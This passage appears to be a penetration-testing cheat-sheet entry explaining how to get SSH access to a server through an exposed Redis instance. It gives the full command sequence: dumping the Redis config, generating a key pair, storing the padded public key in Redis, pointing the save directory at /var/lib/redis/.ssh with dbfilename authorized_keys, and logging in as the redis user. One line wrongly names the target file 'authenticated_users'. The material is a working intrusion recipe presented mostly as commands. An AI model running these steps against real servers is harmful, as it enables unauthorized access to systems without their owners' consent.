___

```bash
redis-cli -h $IP
> info
> CONFIG GET *
```

# SSH

Please be aware *config get dir* result can be changed after other manually exploit commands. Suggest to run it first right after login into Redis. In the output of `config get dir` you could find the **home** of the **redis user** (usually _/var/lib/redis_ or _/home/redis/.ssh_), and knowing this you know where you can write the `authenticated_users` file to access via ssh **with the user redis**. If you know the home of other valid user where you have writable permissions you can also abuse it:

1. Generate a ssh public-private key pair on your pc: `ssh-keygen -t rsa`
    
2. Write the public key to a file : 
```bash
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
```
    
3. Import the file into redis : `**cat spaced_key.txt | redis-cli -h $IP -x set ssh_key**`
    
4. Save the public key to the **authorized_keys** file on redis server:

```bash
redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
> config set dbfilename "authorized_keys"
OK
> save
OK
```

Finally, you can **ssh** to the **redis server** with private key : ```

```bash
ssh -i id_rsa redis@$IP
```

